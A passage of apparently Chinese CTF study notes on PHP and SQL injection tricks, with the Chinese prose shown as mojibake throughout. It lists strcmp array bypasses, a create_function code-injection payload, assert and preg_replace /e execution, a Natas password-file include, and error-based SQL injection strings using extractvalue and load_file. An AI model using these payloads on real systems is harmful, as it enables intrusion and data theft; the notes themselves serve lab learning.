<li><p>åœ¨ php ä¸­ï¼Œä½¿ç”¨Â <code>Content-Type: multipart/form-data;</code>Â ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¼šå°†å®ƒä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œåœ¨ php çš„é…ç½®ä¸­Â <code>upload_tmp_dir</code>Â å‚æ•°ä¸ºä¿å­˜ä¸´æ—¶æ–‡ä»¶çš„è·¯ç»ï¼Œlinux ä¸‹é¢é»˜è®¤ä¸ºÂ <code>/tmp</code>ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦ php æ¥æ”¶ä¸Šä¼ è¯·æ±‚ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚å¦‚æœå…·æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œé‚£ä¹ˆä¼šå°†è¿™ä¸ªæ–‡ä»¶æ‹·èµ°å‚¨å­˜ã€‚æ— è®ºå¦‚ä½•åœ¨æ‰§è¡Œç»“æŸåè¿™ä¸ªæ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚å¹¶ä¸” php æ¯æ¬¡åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶åéƒ½æœ‰å›ºå®šçš„æ ¼å¼ï¼Œä¸º phpXXXX.tmpï¼ˆWindows ä¸­ï¼‰ã€php**.tmpï¼ˆLinux ä¸­ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ post åŒ…ï¼Œæ­¤æ—¶ php ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯ &#x2F;tmp&#x2F;phpxxxxxxï¼Œæ–‡ä»¶åæœ€å 6 ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚å¦‚ &#x2F;tmp&#x2F;php123abc</p>
</li>
<li><p><code>forward_static_call_array()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå®ƒå…è®¸åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è°ƒç”¨ä¸€ä¸ªé™æ€æ–¹æ³•ã€‚å…¶ä½œç”¨ç±»ä¼¼äº <code>call_user_func_array()</code>ï¼Œä½†ä¸“é—¨ç”¨äºé™æ€æ–¹æ³•è°ƒç”¨</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">forward_static_call_array([&#x27;ç±»å&#x27;, &#x27;é™æ€æ–¹æ³•å&#x27;], å‚æ•°æ•°ç»„);</span><br><span class="line">forward_static_call_array( callable $function ,<span class="built_in"> array </span>$parameters )</span><br></pre></td></tr></table></figure></div>
<p>&emsp;ä¸ <code>call_user_func_array()</code> çš„åŒºåˆ«:<code>call_user_func_array()</code> ä¹Ÿå¯ä»¥ç”¨äºè°ƒç”¨é™æ€æ–¹æ³•ï¼šä½† <code>forward_static_call_array()</code> ä¸»è¦ç”¨äºé™æ€ä¸Šä¸‹æ–‡ï¼Œç‰¹åˆ«æ˜¯åœ¨ç»§æ‰¿åœºæ™¯ä¸‹ï¼Œç¡®ä¿è°ƒç”¨çš„æ˜¯å½“å‰ç±»æˆ–å­ç±»çš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯åŸºç±»çš„æ–¹æ³•ã€‚<br>åœ¨ PHP ä¸­ï¼Œé»˜è®¤å‘½åç©ºé—´ä¸º <code>\</code>ï¼Œå› æ­¤è°ƒç”¨é™æ€æ–¹æ³•æ—¶å¯ä»¥ä½¿ç”¨<strong>ç»å¯¹è·¯å¾„</strong>ï¼š</p>
</li>
<li><p>åœ¨ php å½“ä¸­é»˜è®¤å‘½åç©ºé—´æ˜¯ \ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚<br>æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°å function_name () è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›<br>è€Œå¦‚æœå†™ \function_name () è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»– namespace é‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚<br>ä¸¾ä¾‹ï¼š</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyNamespace</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Custom strlen function in MyNamespace&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello, World!&quot;</span>);  <span class="comment">// è°ƒç”¨çš„æ˜¯å½“å‰å‘½åç©ºé—´ä¸­çš„ strlen()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœä½ æƒ³è°ƒç”¨ PHP åŸç”Ÿçš„ strlen å‡½æ•°ï¼Œåº”è¯¥ä½¿ç”¨ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello, World!&quot;</span>);  <span class="comment">// è°ƒç”¨å…¨å±€çš„ strlen()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>PHP ä¸­çš„ <code>call_user_func()</code>å‡½æ•°ï¼š<br>call_user_func() æ˜¯ PHP çš„ä¸€ä¸ªå›è°ƒå‡½æ•°è°ƒç”¨æ–¹æ³•ï¼Œå®ƒå¯ä»¥ç”¨äº åŠ¨æ€è°ƒç”¨å‡½æ•° æˆ– ç±»çš„æ–¹æ³•ï¼Œå³åœ¨è¿è¡Œæ—¶å†³å®šè¦æ‰§è¡Œå“ªä¸ªå‡½æ•°ï¼Œè€Œä¸æ˜¯åœ¨ä»£ç ç¼–å†™æ—¶å°±å›ºå®šã€‚</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    static function sayHello(<span class="variable">$name</span>) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo call_user_func([<span class="string">&quot;Demo&quot;</span>, <span class="string">&quot;sayHello&quot;</span>], <span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure></div>

</li>
<li><p><code>data://</code> ä¼ªåè®®å…è®¸åœ¨ URL ç›´æ¥å­˜å‚¨æ•°æ®ï¼Œè€Œä¸éœ€è¦å®é™…æ–‡ä»¶ã€‚</p>
</li>
<li><p><code>intval()</code> æ˜¯ PHP çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒç”¨äºå°†å˜é‡è½¬æ¢ä¸ºæ•´æ•°ï¼ˆintegerï¼‰ã€‚å®ƒçš„åŸºæœ¬ç”¨æ³•å¦‚ä¸‹ï¼š</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span>ï¼ˆå¿…éœ€ï¼‰ï¼šè¦è½¬æ¢çš„å€¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ç­‰ã€‚</span><br><span class="line"><span class="variable">$base</span>ï¼ˆå¯é€‰ï¼‰ï¼šè¿›åˆ¶ï¼Œé»˜è®¤ä¸º <span class="number">10</span>ã€‚ä»…å½“ <span class="variable">$value</span> æ˜¯å­—ç¬¦ä¸²æ—¶æœ‰æ•ˆï¼Œå¯ç”¨äºè½¬æ¢ä¸åŒè¿›åˆ¶çš„æ•°å­—ï¼ˆå¦‚äºŒè¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼‰ã€‚</span><br></pre></td></tr></table></figure></div>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">echo <span class="built_in">intval</span>(&quot;<span class="number">42</span>&quot;); <span class="comment">// è¾“å‡º: 42 </span></span><br><span class="line">echo <span class="built_in">intval</span>(&quot;<span class="number">42</span>abc&quot;); <span class="comment">// è¾“å‡º: 42ï¼ˆé‡åˆ°éæ•°å­—å­—ç¬¦åœæ­¢è½¬æ¢ï¼‰ </span></span><br><span class="line">echo <span class="built_in">intval</span>(&quot;abc42&quot;); <span class="comment">// è¾“å‡º: 0ï¼ˆæ— æ³•è½¬æ¢åˆ™è¿”å› 0ï¼‰</span></span><br><span class="line">echo <span class="built_in">intval</span>(<span class="number">4.9</span>); <span class="comment">// è¾“å‡º: 4ï¼ˆç›´æ¥å–æ•´ï¼Œä¸æ˜¯å››èˆäº”å…¥ï¼‰ </span></span><br><span class="line">echo <span class="built_in">intval</span>(-<span class="number">4.9</span>); <span class="comment">// è¾“å‡º: -4</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>preg_match &#x2F;iæ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„</p>
</li>
<li><p>phpä¸­çš„å‡ ç±»å±æ€§ï¼š publicå…¬æœ‰çš„å±æ€§æˆ–æ–¹æ³•å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ï¼ŒåŒ…æ‹¬ç±»çš„å†…éƒ¨ã€å¤–éƒ¨ä»¥åŠå­ç±»ä¸­<br>privateç§æœ‰çš„å±æ€§æˆ–æ–¹æ³•åªèƒ½åœ¨å…¶å®šä¹‰çš„ç±»å†…éƒ¨è¢«è®¿é—®ï¼Œä¸èƒ½åœ¨å­ç±»æˆ–ç±»çš„å¤–éƒ¨è®¿é—®<br>protectedå—ä¿æŠ¤çš„å±æ€§æˆ–æ–¹æ³•åªèƒ½åœ¨ç±»çš„å†…éƒ¨ã€å­ç±»æˆ–çˆ¶ç±»ä¸­è¢«è®¿é—®ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨ç›´æ¥è®¿é—®</p>
</li>
<li><p>åœ¨ PHP ä¸­ï¼Œ<code>strstr()</code> å‡½æ•°ç”¨äºåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æŒ‡å®šçš„å­å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä»è¯¥å­å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®å¼€å§‹çš„å‰©ä½™éƒ¨åˆ†ã€‚</p>
</li>
<li><p>åœ¨ PHP é‡Œï¼Œè‹¥å‘Â <code>strcmp</code>Â å‡½æ•°ä¼ å…¥æ•°ç»„è€Œéå­—ç¬¦ä¸²ï¼Œä¼šå¼•å‘è­¦å‘Šå¹¶è¿”å›Â <code>null</code>ã€‚ç”±äºÂ <code>null</code>Â åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­è¢«è§†ä¸ºÂ <code>false</code>ï¼Œç»è¿‡é€»è¾‘éè¿ç®—ç¬¦Â <code>!</code>Â å¤„ç†åå°±å˜æˆäº†Â <code>true</code>ã€‚å› æ­¤ï¼Œå½“ä½ ä»¥æ•°ç»„å½¢å¼ä¼ å…¥Â <code>passwd</code>Â å‚æ•°æ—¶ï¼Œè¿™ä¸ªæ¡ä»¶è¡¨è¾¾å¼ä¼šè¢«åˆ¤å®šä¸ºçœŸï¼Œä»è€Œå®ç°ç»•è¿‡ã€‚ <code>passwd[]=1</code></p>
</li>
<li><p>è¦çœ‹æ–‡ä»¶bçš„å†…å®¹ï¼Œä½†æ˜¯åªèƒ½åœ¨æ–‡ä»¶bå†™å†…å®¹å’Œåœ¨æ–‡ä»¶bé‡Œé¢ ï¼Œå¯ä»¥å†™<code>&lt;?php include &#39;/etc/natas_webpass/natas26&#39;; ?&gt;</code></p>
</li>
<li><p>phpä¸­è¯»å–æ–‡ä»¶ç›®å½•çš„å‡½æ•°è¿˜æœ‰scandir  è¿‡æ»¤äº†. å¯ä»¥ç”¨chr(47) ä¹Ÿå°±æ˜¯chr + asciiç çš„æ–¹å¼ç»•è¿‡</p>
</li>
<li><p>phpä¸­çš„show_sourceæ˜¯æŸ¥çœ‹å†…å®¹çš„å‡½æ•° æˆ–è€…file_get_contents</p>
</li>
<li><p>phpä¸­ç”¨getå’Œpostä¼ å…¥çš„å‚æ•°å¦‚æœæœ‰<code>.å’Œç©ºæ ¼</code>ä¼šè½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>,å¦‚æœæ˜¯<code>+</code>å·ä¼šè½¬æ¢æˆ<code>ç©ºæ ¼</code> ï¼ˆå¯ä»¥è¿ç»­å˜æ¢ +å·å˜æˆç©ºæ ¼å†å˜æˆä¸‹åˆ’çº¿ï¼‰</p>
</li>
<li><p>æŠŠå­—æ¯æ•°å­—å…¨éƒ¨ç¦ç”¨ï¼Œåé¢æ˜¯æ‰§è¡Œä¸¤ä¸ªå˜é‡çš„åŠ¨æ€å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡<code>\create_function</code>è°ƒç”¨å…¨å±€å‡½æ•°ï¼Œå¹¶ä¸”ç»•è¿‡wafï¼Œç„¶åbç”¨<code>&#125;</code>é—­åˆæ’å…¥æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæœ€å<code>/*</code>æ³¨é‡Šåé¢çš„å†…å®¹</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;Â Â Â Â show_source(<span class="variable constant_">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;Â Â Â Â <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">a</span>=\create_function</span><br><span class="line">- b=&#125;<span class="keyword">system</span>(<span class="string">&#x27;ä½ æƒ³æ‰§è¡Œçš„å‘½ä»¤&#x27;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>å‘½ä»¤å‡½æ•°ï¼š  <code>assert</code>åœ¨php5å’Œphp7ä¸­å¦‚æœä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«å½“æˆå‘½ä»¤æ‰§è¡Œ<code>assert($_POST[&#39;cmd&#39;]); </code><br>      <code>create_function</code>ä¹Ÿæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°<br>      <code>preg_replace() é…åˆ /e ä¿®é¥°ç¬¦</code></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> å°† <span class="string">&#x27;shell&#x27;</span> è¿™ä¸ªè¯æ›¿æ¢ä¸º phpinfo() æ‰§è¡Œåçš„ç»“æœ</span><br><span class="line">preg_replace(<span class="string">&#x27;/shell/e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<pre><code>        `call_user_func() / call_user_func_array()` è°ƒç”¨ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°åï¼Œåé¢çš„å‚æ•°æ˜¯ä¼ ç»™è¯¥å‡½æ•°çš„å‚æ•°ã€‚
</code></pre>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç›´æ¥è°ƒç”¨ assert</span></span><br><span class="line">call_user_func<span class="punctuation">(</span>&#x27;assert&#x27;<span class="punctuation">,</span> &#x27;phpinfo()&#x27;<span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure>
<pre><code>    ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤å‡½æ•°ï¼š system exec shell_exec åå¼•å·   exec
    `passthru` æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨å‘½ä»¤ï¼Œå¹¶ä¸”ç›´æ¥æ˜¾ç¤ºæ‰€æœ‰è¾“å‡ºï¼Œé€‚åˆç”¨æ¥è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼ˆæ¯”å¦‚å›¾ç‰‡ï¼‰ã€‚ 
</code></pre>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ISBL"><figure class="iseeu highlight /isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">header</span>(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>); <span class="comment">// ç¡®ä¿æµè§ˆå™¨æŒ‰çº¯æ–‡æœ¬æ˜¾ç¤º</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span>(<span class="string">&#x27;cat /etc/hosts&#x27;</span>);</span></span><br></pre></td></tr></table></figure></div>
<pre><code>    popen() proc_open() : è¿™ä¸¤ä¸ªå‡½æ•°æ›´å¼ºå¤§ï¼Œå®ƒä»¬ä¼šæ‰“å¼€ä¸€ä¸ªè¿›ç¨‹â€œç®¡é“â€ï¼Œå¯ä»¥åƒè¯»å†™æ–‡ä»¶ä¸€æ ·ä¸å‘½ä»¤è¿›è¡Œäº¤äº’ï¼ˆæ¯”å¦‚å‘å‘½ä»¤è¾“å…¥æ•°æ®ï¼Œæˆ–è¯»å–å‘½ä»¤çš„è¾“å‡ºï¼‰ã€‚
</code></pre>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#x27;r&#x27; è¡¨ç¤ºè¯»å–å‘½ä»¤çš„è¾“å‡º</span></span><br><span class="line">$handle = <span class="keyword">popen</span>(<span class="string">&#x27;ls -la&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">$read = <span class="keyword">fread</span>($handle, <span class="number">2096</span>);</span><br><span class="line">echo $read;</span><br><span class="line"><span class="keyword">pclose</span>($handle);</span><br></pre></td></tr></table></figure></div>

<h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><ul>
<li>sqlæ³¨å…¥å•å¼•å·è¢«è¿‡æ»¤çš„æ—¶å€™ç”¨åŒå¼•å·</li>
<li>å¸¸è§sqlæ³¨å…¥è¿‡æ»¤  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">ç©ºæ ¼è¿‡æ»¤Â â†’ ç”¨Â `/**/`ã€`%<span class="number">0</span>a`ã€`%<span class="number">0</span>d`Â ä»£æ›¿ã€‚</span><br><span class="line">å¼•å·è¿‡æ»¤Â â†’ ç”¨Â `Hex`Â ç¼–ç æˆ–å­—ç¬¦ä¸²å‡½æ•°ï¼ˆå¦‚Â `CHAR(<span class="number">97</span>)`ï¼‰ã€‚</span><br><span class="line">å…³é”®è¯è¿‡æ»¤ Â â†’ å°è¯•å¤§å°å†™ã€å†…è”æ³¨é‡Šï¼ˆ`SEL<span class="comment">/*!*/</span>ECT`ï¼‰ã€å†—ä½™è¯­æ³•ï¼ˆ`UNION ALL SELECT`ï¼‰ã€‚</span><br><span class="line">é€—å·è¿‡æ»¤ Â â†’ ä½¿ç”¨Â `JOIN`Â ä»£æ›¿Â `UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`ã€‚</span><br><span class="line">ç­‰å·è¿‡æ»¤ Â â†’ ç”¨Â `LIKE`Â æˆ–Â `IN`Â ç»•è¿‡ï¼Œä¾‹å¦‚Â `WHERE id LIKE <span class="number">1</span>`ã€‚</span><br></pre></td></tr></table></figure></div></li>
<li>æ•°æ®åº“æŸ¥è¯¢é•¿åº¦è¶…å‡ºå¾…æŸ¥è¯¢çš„å­—ç¬¦ä¸²åä¼šè¿”å›ç‰¹æ®Šå­—ç¬¦ NULL æˆ–è€… ï¼ç­‰</li>
<li>mysqlä¸­çš„åå¼•å·æ˜¯ä¸ºäº†åŒºåˆ† MYSQL çš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦ï¼Œæ‰€ä»¥æ²¡æœ‰è¿‡æ»¤åå¼•å·å°±å¯ä»¥ç”¨åå¼•å·æ¥ç»•è¿‡ ä¿ç•™å­—æ¯”å¦‚user</li>
<li>mysqlå¯ä»¥ç”¨load_file()å‡½æ•°è¯»å–æ–‡ä»¶union select load_file(â€˜path_to_fileâ€™) ç›®å½•å¯ä»¥é€‰&#x2F;var&#x2F;www&#x2F;html&#x2F;</li>
<li>åœ¨ MySQL ä¸­ï¼Œ<code>WHERE</code> å­å¥åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²æ—¶ä¼šå¿½ç•¥å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ã€‚ä¾‹å¦‚ï¼Œå½“æ‰§è¡Œ <code>SELECT * FROM table WHERE column = &#39;cs &#39;;</code> æ—¶ï¼ŒMySQL ä¼šå°†å…¶è§†ä¸º <code>&#39;cs&#39;</code> è¿›è¡Œæ¯”è¾ƒï¼Œåªè¦ <code>column</code> åˆ—çš„å€¼ä¸º <code>&#39;cs&#39;</code> å°±ä¼šåŒ¹é…æˆåŠŸã€‚è¿™ä¸€ç‰¹æ€§å¯ä»¥ç”¨äºç»•è¿‡ä¸€äº›è¾“å…¥è¿‡æ»¤æœºåˆ¶ã€‚</li>
<li><strong>CHAR å’Œ VARCHAR åˆ—æœ‰æœ€å¤§é•¿åº¦é™åˆ¶</strong>ï¼šå½“ç»™ <code>CHAR</code> æˆ– <code>VARCHAR</code> åˆ—èµ‹å€¼æ—¶ï¼Œå¦‚æœå€¼çš„é•¿åº¦è¶…è¿‡äº†åˆ—çš„æœ€å¤§é•¿åº¦ï¼Œå°±ä¼šå¯¹å€¼è¿›è¡Œè£å‰ªä»¥ä½¿å…¶é€‚åˆåˆ—çš„é•¿  åº¦ã€‚<br>&emsp;<strong>ä¸¥æ ¼ SQL æ¨¡å¼çš„å½±å“</strong>ï¼š<br>&emsp;<strong>ä¸¥æ ¼æ¨¡å¼ä¸‹</strong>ï¼šå¦‚æœè¢«è£æ‰çš„å­—ç¬¦ä¸æ˜¯ç©ºæ ¼ï¼Œä¼šäº§ç”Ÿé”™è¯¯å¹¶ç¦ç”¨å€¼çš„æ’å…¥ã€‚<br>&emsp;<strong>éä¸¥æ ¼æ¨¡å¼ä¸‹</strong>ï¼šä¸ç®¡è¢«è£æ‰çš„å­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šç›´æ¥æˆªæ–­å€¼ï¼Œä¸ä¼šäº§ç”Ÿé”™è¯¯ã€‚<br>(ç”¨æ³•ä¸¾ä¾‹ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå·²çŸ¥æœ‰ä¸ªadminè´¦å·ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œadminç„¶åå¾ˆå¤šç©ºæ ¼åé¢åœ¨éšä¾¿åŠ ä»€ä¹ˆï¼Œç„¶åä¼šæˆªæ–­ï¼Œå†æ ¹æ®ä¸Šä¸€æ¡ï¼Œwhereä¸­æŸ¥è¯¢ç©ºæ ¼ä¸ä¼šè¢«è®¡ç®—)</li>
<li><code>extractvalue (1,concat (0x7e,database ()))</code> æ ¹æ®é”™è¯¯ä¿¡æ¯çˆ†åº“åçš„æ—¶å€™ç”¨åˆ°<br>EXTRACTVALUE() æ˜¯ MySQL çš„ä¸€ä¸ª XML å¤„ç†å‡½æ•°ï¼Œå®ƒç”¨äºä» XML æ•°æ®ä¸­æå–ç‰¹å®šçš„å€¼.ä½†å¦‚æœä¼ å…¥ é XML ç»“æ„ çš„ XPathï¼Œä¼šæŠ¥é”™ï¼Œå¹¶åœ¨é”™è¯¯ä¿¡æ¯ä¸­æ³„éœ²æ•°æ®.CONCAT() ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ã€‚0x7e æ˜¯ åå…­è¿›åˆ¶çš„ ~ï¼ˆæ³¢æµªå·ï¼‰ç”¨äºæŠ¥é”™ä¿¡æ¯å¯ä»¥å›æ˜¾  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>ï¼š<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()))#</span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;~test_db&#x27;</span><br></pre></td></tr></table></figure></div></li>
<li>sqlæ³¨å…¥ä¸­å¯ä»¥ç”¨<code>substring</code>å‡½æ•°æ¥ç»•è¿‡å­—ç¬¦é•¿åº¦é™åˆ¶  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>ï¼š-<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">0</span>x7e,(select substring(group_concat(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) #</span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;a-ff5d9638a322&#125;&#x27;</span><br></pre></td></tr></table></figure></div></li>
<li>sqlä¸­ <code>LIMIT</code> ä¸»è¦ç”¨äº <strong>é™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡</strong>ï¼Œé€šå¸¸ç”¨äºåˆ†é¡µã€æé«˜æŸ¥è¯¢æ•ˆç‡ç­‰ã€‚<br>  <code>SELECT * FROM table_name LIMIT åç§»é‡ï¼Œæ•°é‡;</code>ï¼Œå°±æ˜¯åœ¨ä½ ç¡®å®šsqlè¯­å¥æ²¡é”™çš„æ—¶å€™ï¼Œè¿”å›çš„å†…å®¹æ²¡é”™ä½†æ˜¯ä¸æ˜¯æƒ³è¦çš„ï¼Œå¯ä»¥åœ¨åé¢åŠ ä¸Šlimit 1,1è¯•è¯•</li>
<li>sqlæ³¨å…¥ä¸­æœ€åçŸ¥é“åˆ—åæŸ¥å€¼çš„æ—¶å€™ï¼Œ1ï¼Œgroup_concat(),3è¿™é‡Œæ‹¬å·ä¸­çš„åå­—ä¸è¦å¼•å·ï¼Œæœ€åçš„fromä¹Ÿä¸ç”¨ã€‚åœ¨çˆ†è¡¨çš„æ—¶å€™è¦åœ¨åº“åå’Œåˆ—åè¦åœ¨åé¢çš„åº“åæˆ–è€…è¡¨ååŠ å¼•å·</li>
<li>sqlæŠ¥é”™æ³¨å…¥è¿˜æœ‰updatexmlå‡½æ•°</li>
</ul>
